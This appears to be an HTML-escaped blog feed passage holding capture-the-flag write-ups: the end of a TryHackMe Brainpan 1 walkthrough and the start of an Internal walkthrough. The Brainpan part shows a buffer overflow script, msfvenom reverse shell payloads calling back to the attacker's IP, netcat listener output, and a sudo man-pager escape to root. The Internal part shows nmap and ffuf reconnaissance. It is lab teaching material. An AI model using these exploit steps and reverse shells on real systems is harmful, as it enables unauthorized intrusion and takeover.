&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">try:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> s.connect&lt;span class="o">((&lt;/span>ip, port&lt;span class="o">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> print&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;Sending evil buffer...&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> s.send&lt;span class="o">(&lt;/span>bytes&lt;span class="o">(&lt;/span>buffer + &lt;span class="s2">&amp;#34;\r\n&amp;#34;&lt;/span>, &lt;span class="s2">&amp;#34;latin-1&amp;#34;&lt;/span>&lt;span class="o">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> print&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;Done!&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">except:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> print&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;Could not connect.&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>With 600 bytes the server crushes.&lt;/p>
&lt;p>So I am going to use metasploit to create a payload:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l &lt;span class="m">5000&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And I got the offset using mona:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">!mona findmsp -distance &lt;span class="m">5000&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Brainpan1-writeup-THM/main/754f5e1d-ea90-41d9-9bdf-c35333bf9929_Export-364cf768-db35-42c3-9c8f-01faddec3169/Brainpan%201%20ad62754b337f4b43b8bb42d82d0a7e29/Untitled%202.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>Now I can put the offset in the offset variable inside the script.&lt;/p>
&lt;p>I am going to start searching for the bad characters:&lt;/p>
&lt;p>Using a payload with all the characters and compare it with mona we get this:&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Brainpan1-writeup-THM/main/754f5e1d-ea90-41d9-9bdf-c35333bf9929_Export-364cf768-db35-42c3-9c8f-01faddec3169/Brainpan%201%20ad62754b337f4b43b8bb42d82d0a7e29/Untitled%203.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>After that we search for the jmp:&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/Brainpan1-writeup-THM/main/754f5e1d-ea90-41d9-9bdf-c35333bf9929_Export-364cf768-db35-42c3-9c8f-01faddec3169/Brainpan%201%20ad62754b337f4b43b8bb42d82d0a7e29/Untitled%204.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>We need to put this in the retn variable of the script: \zf3\x12\x17\x31 (It is reversed because of the little eldiana rchitecture, which x86 CPUs have.)&lt;/p>
&lt;p>Then we generate our payload:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">msfvenom -p windows/shell_reverse_tcp &lt;span class="nv">LHOST&lt;/span>&lt;span class="o">=&lt;/span>10.18.20.116 &lt;span class="nv">LPORT&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">4444&lt;/span> &lt;span class="nv">EXITFUNC&lt;/span>&lt;span class="o">=&lt;/span>thread -b &lt;span class="s2">&amp;#34;\x00\x01\x02\x03\x04\x06\x07&amp;#34;&lt;/span> -f c
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And put it in the code.&lt;/p>
&lt;p>And now if we run the code we should have a shell:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -lvnp &lt;span class="m">4444&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">listening on &lt;span class="o">[&lt;/span>any&lt;span class="o">]&lt;/span> &lt;span class="m">4444&lt;/span> ...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">connect to &lt;span class="o">[&lt;/span>10.18.20.116&lt;span class="o">]&lt;/span> from &lt;span class="o">(&lt;/span>UNKNOWN&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>10.10.6.37&lt;span class="o">]&lt;/span> &lt;span class="m">49292&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Microsoft Windows &lt;span class="o">[&lt;/span>Version 6.1.7601&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Copyright &lt;span class="o">(&lt;/span>c&lt;span class="o">)&lt;/span> &lt;span class="m">2009&lt;/span> Microsoft Corporation. All rights reserved.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\a&lt;/span>dmin&lt;span class="se">\D&lt;/span>esktop&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Now I am just going to change the ip of the script and put the one of the machine, and we should have a shell in the remote server:&lt;/p>
&lt;ul>
&lt;li>note, i have used another msfvenom payload for this one:&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">msfvenom -p linux/x86/shell_reverse_tcp &lt;span class="nv">LHOST&lt;/span>&lt;span class="o">=&lt;/span>10.18.20.116 &lt;span class="nv">LPORT&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">4444&lt;/span> &lt;span class="nv">EXITFUNC&lt;/span>&lt;span class="o">=&lt;/span>thread -b &lt;span class="s2">&amp;#34;\x00\x01\x02\x03\x04\x06\x07&amp;#34;&lt;/span> -f c
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -lvnp &lt;span class="m">4555&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">listening on &lt;span class="o">[&lt;/span>any&lt;span class="o">]&lt;/span> &lt;span class="m">4555&lt;/span> ...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">connect to &lt;span class="o">[&lt;/span>10.18.20.116&lt;span class="o">]&lt;/span> from &lt;span class="o">(&lt;/span>UNKNOWN&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>10.10.143.30&lt;span class="o">]&lt;/span> &lt;span class="m">41139&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ls
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">checksrv.sh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">web
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python -c &lt;span class="s1">&amp;#39;import pty;pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">puck@brainpan:/home/puck$ sudo -l
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo -l
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Matching Defaults entries &lt;span class="k">for&lt;/span> puck on this host:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> env_reset, mail_badpass,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">secure_path&lt;/span>&lt;span class="o">=&lt;/span>/usr/local/sbin&lt;span class="se">\:&lt;/span>/usr/local/bin&lt;span class="se">\:&lt;/span>/usr/sbin&lt;span class="se">\:&lt;/span>/usr/bin&lt;span class="se">\:&lt;/span>/sbin&lt;span class="se">\:&lt;/span>/bin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">User puck may run the following commands on this host:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">(&lt;/span>root&lt;span class="o">)&lt;/span> NOPASSWD: /home/anansi/bin/anansi_util
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">puck@brainpan:/home/puck$
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Nice!&lt;/p>
&lt;p>We can see that we can run anansi_util with root&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo /home/anansi/bin/anansi_util
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Usage: /home/anansi/bin/anansi_util &lt;span class="o">[&lt;/span>action&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Where &lt;span class="o">[&lt;/span>action&lt;span class="o">]&lt;/span> is one of:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - network
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - proclist
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - manual &lt;span class="o">[&lt;/span>command&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>The interessing thing is the manual command, which is the man command.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo /home/anansi/bin/anansi_util manual /bin/sh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/bin/man: manual-/bin/sh: No such file or directory
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/bin/man: manual_/bin/sh: No such file or directory
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">No manual entry &lt;span class="k">for&lt;/span> manual
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">WARNING: terminal is not fully functional
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- &lt;span class="o">(&lt;/span>press RETURN&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DASH&lt;span class="o">(&lt;/span>1&lt;span class="o">)&lt;/span> BSD General Commands Manual DASH&lt;span class="o">(&lt;/span>1&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">NAME
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> dash — &lt;span class="nb">command&lt;/span> interpreter &lt;span class="o">(&lt;/span>shell&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SYNOPSIS
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> dash &lt;span class="o">[&lt;/span>-aCefnuvxIimqVEb&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>+aCefnuvxIimqVEb&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>-o option_name&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>+o option_name&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>command_file &lt;span class="o">[&lt;/span>argument ...&lt;span class="o">]]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> dash -c &lt;span class="o">[&lt;/span>-aCefnuvxIimqVEb&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>+aCefnuvxIimqVEb&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>-o option_name&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>+o option_name&lt;span class="o">]&lt;/span> command_string &lt;span class="o">[&lt;/span>command_name &lt;span class="o">[&lt;/span>argument ...&lt;span class="o">]]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> dash -s &lt;span class="o">[&lt;/span>-aCefnuvxIimqVEb&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>+aCefnuvxIimqVEb&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>-o option_name&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>+o option_name&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>argument ...&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DESCRIPTION
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> dash is the standard &lt;span class="nb">command&lt;/span> interpreter &lt;span class="k">for&lt;/span> the system. The current
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> version of dash is in the process of being changed to conform with the
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> POSIX 1003.2 and 1003.2a specifications &lt;span class="k">for&lt;/span> the shell. This version has
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> many features which make it appear similar in some respects to the Korn
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> shell, but it is not a Korn shell clone &lt;span class="o">(&lt;/span>see ksh&lt;span class="o">(&lt;/span>1&lt;span class="o">))&lt;/span>. Only features des‐
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ignated by POSIX, plus a few Berkeley extensions, are being incorporated
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> into this shell. This man page is not intended to be a tutorial or a
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">complete&lt;/span> specification of the shell.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Manual page sh&lt;span class="o">(&lt;/span>1&lt;span class="o">)&lt;/span> line &lt;span class="m">1&lt;/span> &lt;span class="o">(&lt;/span>press h &lt;span class="k">for&lt;/span> &lt;span class="nb">help&lt;/span> or q to quit&lt;span class="o">)&lt;/span>!/bin/sh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">!/bin/sh
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># whoami&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">whoami
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And just like that we got a root shell!&lt;/p></description></item><item><title>Internal Writeup THM</title><link>https://simonefelici.github.io/p/internal-writeup-thm/</link><pubDate>Mon, 01 Jan 2024 18:00:00 +0100</pubDate><guid>https://simonefelici.github.io/p/internal-writeup-thm/</guid><description>&lt;img src="https://images.unsplash.com/photo-1495592822108-9e6261896da8?q=80&amp;w=2670&amp;auto=format&amp;fit=crop&amp;ixlib=rb-4.0.3&amp;ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D" alt="Featured image of post Internal Writeup THM" />&lt;p>The first thing that I am going to do is a nmap scan:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo nmap -A 10.10.186.60
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting Nmap 7.94SVN &lt;span class="o">(&lt;/span> https://nmap.org &lt;span class="o">)&lt;/span> at 2023-12-31 14:46 EST
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Nmap scan report &lt;span class="k">for&lt;/span> internal.thm &lt;span class="o">(&lt;/span>10.10.186.60&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host is up &lt;span class="o">(&lt;/span>0.055s latency&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Not shown: &lt;span class="m">998&lt;/span> closed tcp ports &lt;span class="o">(&lt;/span>reset&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE VERSION
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class="o">(&lt;/span>Ubuntu Linux&lt;span class="p">;&lt;/span> protocol 2.0&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ssh-hostkey:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">2048&lt;/span> 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e &lt;span class="o">(&lt;/span>RSA&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="m">256&lt;/span> ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 &lt;span class="o">(&lt;/span>ECDSA&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ &lt;span class="m">256&lt;/span> b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff &lt;span class="o">(&lt;/span>ED25519&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http Apache httpd 2.4.29 &lt;span class="o">((&lt;/span>Ubuntu&lt;span class="o">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-server-header: Apache/2.4.29 &lt;span class="o">(&lt;/span>Ubuntu&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-title: Apache2 Ubuntu Default Page: It works
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>I found 2 ports,&lt;/p>
&lt;ul>
&lt;li>22(SSH)&lt;/li>
&lt;li>80(HTTP)&lt;/li>
&lt;/ul>
&lt;p>The first thing that I am going to do is exploring the web page in port 80.&lt;/p>
&lt;p>I get meeted by the Apache2 Ubuntu Default Page, so now I know that the server is running the ubuntu and Apache2.&lt;/p>
&lt;p>But that’s all forn know, so I started a subdomain/subdirectory enumeration,&lt;/p>
&lt;p>The directory that I have found are those:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ffuf -u http://10.10.186.60:80/FUZZ -w /usr/share/wordlists/dirb/big.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /&lt;span class="s1">&amp;#39;___\ /&amp;#39;&lt;/span>___&lt;span class="se">\ &lt;/span> /&lt;span class="err">&amp;#39;&lt;/span>___&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> /&lt;span class="se">\ \_&lt;/span>_/ /&lt;span class="se">\ \_&lt;/span>_/ __ __ /&lt;span class="se">\ \_&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \ &lt;/span>,__&lt;span class="se">\\&lt;/span> &lt;span class="se">\ &lt;/span>,__&lt;span class="se">\/\ \/\ \ \ \ &lt;/span>,__&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\ \ \_&lt;/span>/ &lt;span class="se">\ \ \_&lt;/span>/&lt;span class="se">\ \ \_\ \ \ \ \_&lt;/span>/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_&lt;/span>___/ &lt;span class="se">\ \_\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>___/ &lt;span class="se">\/&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> v2.1.0-dev
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Method : GET
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: URL : http://10.10.186.60:80/FUZZ
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Follow redirects : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Calibration : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Timeout : &lt;span class="m">10&lt;/span>
